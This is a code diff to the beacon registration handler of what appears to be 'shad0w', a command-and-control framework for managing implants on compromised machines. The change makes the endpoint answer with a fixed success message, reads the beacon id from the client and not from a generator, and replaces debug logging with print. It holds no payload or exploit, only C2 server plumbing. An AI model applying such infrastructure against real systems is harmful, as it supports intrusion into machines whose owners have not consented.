@@ -81,8 +81,13 @@ class Handler(object):
             # get the info from the initial request an store it
             # just ignore if the request isnt correct
 
+            if request.method == "GET":
+                # TODO: generate this better
+                return "{\"status\":\"success\"}"
+
             if request.method == "POST":
 
+                beacon_id    = request.form.get("id")
                 username     = request.form.get("username")
                 domain       = request.form.get("domain")
                 machine      = request.form.get("machine")
@@ -92,7 +97,7 @@ class Handler(object):
                 impersonate  = request.form.get("impersonate")
 
                 if username and machine and domain:
-                    beacon_id = tools.generate_beacon_id()
+                    # beacon_id = tools.generate_beacon_id()
 
                     # init the new beacons dict
                     self.shad0w.beacons[beacon_id]                 = {}
@@ -149,15 +154,14 @@ class Handler(object):
                         # create the dict to store its output
                         self.shad0w.event._create_beacon_holder(beacon_id)
 
-                    # give the beacon there id, this is how we will identify them now
-                    return self.builder.build(beacon_id=beacon_id, id=beacon_id)
+                    return "{\"status\":\"success\"}"
 
                 else:
-                    self.shad0w.debug.log("invalid register request")
+                    print("invalid register request")
                     return self.builder.build(blank=True)
 
-            else:
-                self.shad0w.debug.log("invaild http method for register")
+            if request.method != "POST" and request.method != "GET":
+                print("invaild http method for register")
                 return self.builder.build(blank=True)
 
     def stage_beacon(self, request):
